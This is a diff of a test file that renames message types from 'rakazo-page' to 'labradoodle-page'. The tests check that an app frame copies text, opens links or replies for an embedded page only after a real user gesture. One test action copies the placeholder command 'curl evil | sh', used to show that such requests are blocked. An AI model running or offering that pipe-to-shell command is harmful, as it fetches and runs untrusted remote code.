@@ -32,13 +32,13 @@ it("copies what its own page asks from the app's frame and answers whether it wo
       await new Promise((resolve) => setTimeout(resolve, 0));
     });
 
-  await send({ type: "rakazo-page:copy", id: "a", text: "Copy yes", gesture: "k:1" });
-  await send({ type: "rakazo-page:copy", id: "b", text: "Copy no", gesture: "k:2" });
+  await send({ type: "labradoodle-page:copy", id: "a", text: "Copy yes", gesture: "k:1" });
+  await send({ type: "labradoodle-page:copy", id: "b", text: "Copy no", gesture: "k:2" });
   // Another window, an oversized text or a non-string never reach the clipboard.
-  await send({ type: "rakazo-page:copy", id: "c", text: "spoof", gesture: "k:3" }, window);
-  await send({ type: "rakazo-page:copy", id: "d", text: "x".repeat(20_001), gesture: "k:4" });
+  await send({ type: "labradoodle-page:copy", id: "c", text: "spoof", gesture: "k:3" }, window);
+  await send({ type: "labradoodle-page:copy", id: "d", text: "x".repeat(20_001), gesture: "k:4" });
   await send({
-    type: "rakazo-page:copy",
+    type: "labradoodle-page:copy",
     id: "e",
     text: { toString: () => "x" },
     gesture: "k:5",
@@ -46,8 +46,8 @@ it("copies what its own page asks from the app's frame and answers whether it wo
 
   expect(writeText.mock.calls).toEqual([["Copy yes"], ["Copy no"]]);
   expect(answers.mock.calls).toEqual([
-    [{ type: "rakazo-page:copied", id: "a", ok: true }, "*"],
-    [{ type: "rakazo-page:copied", id: "b", ok: false }, "*"],
+    [{ type: "labradoodle-page:copied", id: "a", ok: true }, "*"],
+    [{ type: "labradoodle-page:copied", id: "b", ok: false }, "*"],
   ]);
   await act(async () => root.unmount());
 });
@@ -72,7 +72,7 @@ it("copies by selection where the page has no Clipboard API, as on plain http", 
   await act(async () => {
     window.dispatchEvent(
       new MessageEvent("message", {
-        data: { type: "rakazo-page:copy", id: "a", text: "MRR $12,400", gesture: "k:1" },
+        data: { type: "labradoodle-page:copy", id: "a", text: "MRR $12,400", gesture: "k:1" },
         source: frame.contentWindow,
       }),
     );
@@ -81,7 +81,7 @@ it("copies by selection where the page has no Clipboard API, as on plain http", 
   expect(copied).toEqual(["MRR $12,400"]);
   // The hidden field is gone once copied.
   expect(document.querySelector("textarea")).toBeNull();
-  expect(answers.mock.calls).toEqual([[{ type: "rakazo-page:copied", id: "a", ok: true }, "*"]]);
+  expect(answers.mock.calls).toEqual([[{ type: "labradoodle-page:copied", id: "a", ok: true }, "*"]]);
   await act(async () => root.unmount());
   Reflect.deleteProperty(document, "execCommand");
 });
@@ -117,9 +117,9 @@ it("acts for a page only in an interactive frame, right after the person used th
   let gestures = 0;
   const actions = (vouched: boolean) =>
     [
-      { type: "rakazo-page:copy", id: "a", text: "curl evil | sh" },
-      { type: "rakazo-page:open-link", url: "mailto:a@example.com" },
-      { type: "rakazo-page:reply", text: "Ship it" },
+      { type: "labradoodle-page:copy", id: "a", text: "curl evil | sh" },
+      { type: "labradoodle-page:open-link", url: "mailto:a@example.com" },
+      { type: "labradoodle-page:reply", text: "Ship it" },
     ].map((action) => ({ ...action, gesture: vouched ? `k:${++gestures}` : null }));
 
   // A preview only draws: even a focused, vouched-for request does nothing, though it sizes.
@@ -127,7 +127,7 @@ it("acts for a page only in an interactive frame, right after the person used th
   expect(container.querySelector("iframe")!.hasAttribute("allow")).toBe(false);
   container.querySelector("iframe")!.focus();
   for (const action of actions(true)) await send(action);
-  await send({ type: "rakazo-page:height", height: 300 });
+  await send({ type: "labradoodle-page:height", height: 300 });
   expect(heights).toHaveLength(1);
 
   await render(true);
@@ -146,20 +146,20 @@ it("acts for a page only in an interactive frame, right after the person used th
 
   // One click or key lets the page ask for one action: whatever else it asks for with that same
   // click, even a different action, is dropped; height reports still pass.
-  await send({ type: "rakazo-page:copy", id: "b", text: "first", gesture: "k:once" });
-  await send({ type: "rakazo-page:copy", id: "c", text: "second", gesture: "k:once" });
-  await send({ type: "rakazo-page:reply", text: "And reply", gesture: "k:once" });
-  await send({ type: "rakazo-page:height", height: 400 });
+  await send({ type: "labradoodle-page:copy", id: "b", text: "first", gesture: "k:once" });
+  await send({ type: "labradoodle-page:copy", id: "c", text: "second", gesture: "k:once" });
+  await send({ type: "labradoodle-page:reply", text: "And reply", gesture: "k:once" });
+  await send({ type: "labradoodle-page:height", height: 400 });
   expect(writeText.mock.calls.slice(1)).toEqual([["first"]]);
   expect(replies).toEqual(["Ship it"]);
   expect(heights).toHaveLength(2);
   // The next click works again.
-  await send({ type: "rakazo-page:reply", text: "Next", gesture: "k:again" });
+  await send({ type: "labradoodle-page:reply", text: "Next", gesture: "k:again" });
   expect(replies).toEqual(["Ship it", "Next"]);
 
   // A web link asks first, as a link in chat does.
   await send({
-    type: "rakazo-page:open-link",
+    type: "labradoodle-page:open-link",
     url: "https://example.com/x",
     gesture: "k:next",
   });
